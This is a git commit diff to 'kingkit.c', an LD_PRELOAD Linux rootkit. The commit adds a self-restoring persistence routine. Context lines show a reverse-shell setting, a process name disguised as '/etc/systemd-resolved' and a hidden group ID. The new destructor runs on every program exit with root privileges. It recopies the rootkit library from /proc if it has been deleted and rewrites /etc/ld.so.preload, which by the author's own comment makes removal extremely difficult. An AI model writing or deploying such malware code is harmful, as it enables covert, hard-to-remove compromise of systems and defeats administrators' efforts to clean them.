2ded923fa1e351ade7f10e85e0af8b812748dd7b
Arnout de Groot <arnoutdegroot11@gmail.com>
2024-11-18 18:45:28 +0100

    Add option to let the rootkit restore itself

--- kingkit.c
+++ kingkit.c
@@ -34,6 +34,7 @@
 #define SHELL "/bin/bash" //shell for reverse shell
 #define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
 #define HIDDEN_GID 5005
+#define ADVANCED_PERSISTENCE 0 //set to 1 if you want that the rootkit restores itself after deletion. know that this will make it extremely difficult to remove the rootkit yourself too.
 #define DEBUG 0 //set to 1 for logging
 
 //don't change these
@@ -45,7 +46,7 @@
 
 
 //global variables
-static char *libpath = NULL;
+static char *libpath = NULL; //this pointer shouldn't ever be free because that breaks any function calls after the destructor is called
 
 
 //function declarations
@@ -60,6 +61,7 @@ int is_protected(char *);
 int forge_procnet(char *pathname);
 int cmp_files(char *, char *);
 void resolve_libpath();
+void persistence();
 
 
 //hooks declarations
@@ -415,6 +417,54 @@ void __attribute__((constructor)) resolve_libpath() {
         strcpy(libpath, so_information.dli_fname);
     }
 }
+
+
+#if ADVANCED_PERSISTENCE
+void __attribute__((destructor)) persistence() { //this function is called when a program exits
+    #if DEBUG
+    printf("[kingkit] resolve_libpath() called.\n");
+    #endif
+    if (libpath == NULL) return;
+    if (geteuid() != 0) return; //confirm that we have root permission, needed to read files under /proc/self/map_files/
+
+    //get data from /proc/self/maps
+    char line[PATH_MAX + 500], addr[100], path[PATH_MAX], proc_pathname[sizeof("/proc/self/map_files/") + 100] = "/proc/self/map_files/"; //these sizes may be garbadge, it should be checked with the code in the kernel behind /proc/PID/maps
+    int inode;
+
+    FILE *f = fopen("/proc/self/maps", "r");
+    if (f == NULL) {
+        return;
+    }
+    while (strcmp(path, libpath) != 0 && fgets(line, sizeof(line), f) != NULL) {
+        sscanf(line, "%s %*s %*s %*s %i %s", addr, &inode, path);
+    }
+    if (strcmp(path, libpath) != 0) {
+        return;
+    }
+    strncat(proc_pathname, addr, 100);
+    fclose(f);
+
+    //compare and reinstall if needed
+    //check libpath
+    struct stat sb;
+    if (stat(libpath, &sb) == -1 || (inode != sb.st_ino && cmp_files(proc_pathname, libpath))) { //if inode is different check the file contents
+        remove(libpath); //remove the filename if it exists because new processes might be using it and we don't want to crash those by corrupting the file
+        int fd_in = open(proc_pathname, O_RDONLY);
+        int fd_out = open(libpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); //if you want this to be atomic you have to use a random filename and then use rename() to give it the final filename.
+        char buf[4096];
+        int bytes = read(fd_in, buf, sizeof(buf));
+        while (bytes > 0 && write(fd_out, buf, bytes) != -1) { //stop on errors and EOF
+            bytes = read(fd_in, buf, sizeof(buf));
+        }
+        close(fd_in);
+        close(fd_out);
+    }
+    //just overwrite /etc/ld.so.preload, checking is too much trouble
+    int fd = open("/etc/ld.so.preload", O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+    write(fd, libpath, (strlen(libpath))); //try rewriting /etc/ld.so.preload
+    close(fd);
+}
+#endif
 
 
 
